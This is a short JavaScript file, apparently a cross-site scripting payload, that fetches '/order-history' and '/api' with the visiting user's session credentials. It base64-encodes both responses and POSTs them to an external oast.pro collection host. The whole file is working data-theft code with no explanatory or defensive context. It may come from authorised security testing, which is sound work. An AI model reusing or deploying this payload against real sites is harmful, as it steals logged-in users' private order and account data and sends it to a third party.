const url = "https://d14tov0gn2sl5jg9g1sgudzxavijmmgex.oast.pro";

async function fetchData() {
    try {
        const response = await fetch('/order-history', {
            method: 'GET',
            headers: {
                'Content-Type': 'application/json',
            },
            credentials: 'include'
        });
        const response1 = await fetch('/api', {
            method: 'GET',
            headers: {
                'Content-Type': 'application/json',
            },
            credentials: 'include'
        });
        if (!response.ok) {
            throw new Error(`HTTP error! Status: ${response.status}`);
        }
        const textData = await response.text();
        const apiData = await response1.text();
        const base64ApiData = btoa(unescape(encodeURIComponent(apiData)));
        const base64Data = btoa(unescape(encodeURIComponent(textData)));
        
        await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'text/plain',
            },
            body: base64Data,
        });
        await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'text/plain',
            },
            body: base64ApiData,
        });
        console.log('Data sent successfully');
    } catch (error) {
        console.error('Error in fetchData:', error);
        throw error; // Re-throw if needed
    }
}

// Execute
fetchData()
    .catch(error => console.error('Final error:', error));
